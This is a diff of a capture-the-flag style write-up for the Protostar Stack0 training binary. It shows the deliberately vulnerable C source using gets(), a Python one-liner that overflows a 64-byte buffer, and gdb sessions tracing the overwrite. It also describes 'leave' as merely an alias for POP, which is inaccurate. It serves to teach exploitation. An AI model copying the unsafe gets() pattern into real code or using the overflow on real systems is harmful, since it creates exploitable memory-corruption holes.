@@ -1,11 +1,10 @@
 # Protostar Stack0
-## Write-up plan
- - [x] Use Radare2 to identify what C APIs were used
- - [x] Run the vulnerable code
- - [x] Try a simple Brute Force script
- - [x] Attach a Debugger to understand what was happening
- - [x] Read the Code to check my results
-
+## Write-up
+ - [x] Static Analysis - identify what C APIs were used
+ - [x] Run the vulnerable code and write a Brute Force script
+ - [x] Attach a Debugger, to inspect variables at run-time what was happening
+ - [x] Read the Code to verify results
+ - [x] Summary
 
 ## Static Analysis
 ##### Open and analyse the binary
@@ -38,7 +37,7 @@ stripped false
 ```
 
 #####  gets
-This is what `man gets` tells you:
+`man gets` tells you:
 
 
 > The gets() function cannot be used securely.  Because
@@ -114,6 +113,7 @@ you have changed the 'modified' variable
 
 $ python -c 'print "A"*(64)'
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
 $ python -c 'print "A"*(64)' | /opt/protostar/bin/stack0
 Try again?
 
@@ -121,18 +121,164 @@ $ python -c 'print "A"*(65)' | /opt/protostar/bin/stack0
 you have changed the 'modified' variable
 ```
 
-## Run vulnerable code in debugger
+##### Start debugger
 ```
+(gdb) set disassembly-flavor intel
+
+(gdb) file stack0
+Reading symbols from /opt/protostar/bin/stack0...done.
+
+
+(gdb) disas main
+Dump of assembler code for function main:
+0x08048411 <main+29>:	mov    0x5c(%esp),%eax
+
 (gdb) r
-Starting program: /opt/protostar/bin/stack0
-a
-Try again?
 
-Program exited with code 013.
+(gdb) frame
+#0  _IO_puts (str=0x8048529 "Try again?") at ioputs.c:37
+37	in ioputs.c
+
+```
+##### Breakpoint
+```
+
+(gdb) b puts
+Breakpoint 1 at 0xb7ef4789: file ioputs.c, line 37.
+
+(gdb) c
+
+(gdb) info locals
+modified = 0
+buffer = "\377\377\377\377\364\357\377\267K\202\004\b\001\000\000\000 \375\377\277&\006\377\267\260\372\377\267(\033\376\267\364\177\375\267\000\000\000\000\000\000\000\000\070\375\377\277i\317\330\301y9\231\353\000\000\000\000\000\000\000"
+
+
+(gdb) info proc mappings
+process 1581
+cmdline = '/opt/protostar/bin/stack0'
+cwd = '/opt/protostar/bin'
+exe = '/opt/protostar/bin/stack0'
+Mapped address spaces:
+
+	Start Addr   End Addr       Size     Offset objfile
+	 0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/stack0
+	 0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/stack0
+	.............
+	.............
+	0xbffeb000 0xc0000000    0x15000          0           [stack]
+
+```
+
+##### Script on Breakpoint
+```
+0x0804840c <main+24>:	call   0x804830c <gets@plt>
+(gdb) b *0x0804840c
+Breakpoint 5 at 0x804840c: file stack0/stack0.c, line 11.
+
+0x08048411 <main+29>:	mov    eax,DWORD PTR [esp+0x5c]
+(gdb) b *0x08048411
+Breakpoint 6 at 0x8048411: file stack0/stack0.c, line 13.
+
+
+(gdb) define hook-stop
+Type commands for definition of "hook-stop".
+End with a line saying just "end".
+>info registers
+>x/24wx $esp
+>x/2i $eip
+>end
+```
+##### Watch Stack values change
+```
+(gdb) c
+Continuing.
+AAAAAAAAAA
+eax            0xbffffc6c	-1073742740
+ecx            0xbffffc6c	-1073742740
+edx            0xb7fd9334	-1208118476
+ebx            0xb7fd7ff4	-1208123404
+esp            0xbffffc50	0xbffffc50
+ebp            0xbffffcb8	0xbffffcb8
+esi            0x0	0
+edi            0x0	0
+eip            0x8048411	0x8048411 <main+29>
+eflags         0x200246	[ PF ZF IF ID ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
+0xbffffc50:	0xbffffc6c	0x00000001	0xb7fff8f8	0xb7f0186e
+0xbffffc60:	0xb7fd7ff4	0xb7ec6165	0xbffffc78	0x41414141
+0xbffffc70:	0x41414141	0x08004141	0xbffffc88	0x080482e8
+0xbffffc80:	0xb7ff1040	0x08049620	0xbffffcb8	0x08048469
+0xbffffc90:	0xb7fd8304	0xb7fd7ff4	0x08048450	0xbffffcb8
+0xbffffca0:	0xb7ec6365	0xb7ff1040	0x0804845b	0x00000000
+---Type <return> to continue, or q <return> to quit---
+
+
+(gdb) c
+Continuing.
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+eax            0xbffffc6c	-1073742740
+ecx            0xbffffc6c	-1073742740
+edx            0xb7fd9334	-1208118476
+ebx            0xb7fd7ff4	-1208123404
+esp            0xbffffc50	0xbffffc50
+ebp            0xbffffcb8	0xbffffcb8
+esi            0x0	0
+edi            0x0	0
+eip            0x8048411	0x8048411 <main+29>
+eflags         0x200246	[ PF ZF IF ID ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
+0xbffffc50:	0xbffffc6c	0x00000001	0xb7fff8f8	0xb7f0186e
+0xbffffc60:	0xb7fd7ff4	0xb7ec6165	0xbffffc78	0x41414141
+0xbffffc70:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffc80:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffc90:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffca0:	0x41414141	0x41414141	0x41414141	0x00000041
+
 ```
 
 
-### Convert Hex to Decimal
+## Source code
+```
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+
+int main(int argc, char **argv)
+{
+  volatile int modified;
+  char buffer[64];
+
+  modified = 0;
+  gets(buffer);
+
+  if(modified != 0) {
+      printf("you have changed the 'modified' variable\n");
+  } else {
+      printf("Try again?\n");
+  }
+}
+
+```
+## Summary
+Although I wanted to use `gets` and a `[ Stack ] Buffer Overflow`, you could patch out the "test' instruction with a static disassembler or at run-time with a debugger.
+
+##### Learnings
+ - [x] Compiler optimisation -> the compiler replaced `printf` with `puts`
+ - [x] c `volatile` keyword -> tells the Compiler not to Optimise away the variable
+ - [x] X86 -> `test` instruction performs a bitwise AND on two operands.
+ - [x] X86 -> `leave` is the opposite of setting up the stack. It is an alias for POP.
+
+##### Appendix - Convert Hex to Decimal
 ```
 $ printf "%02X\n" 65
 41
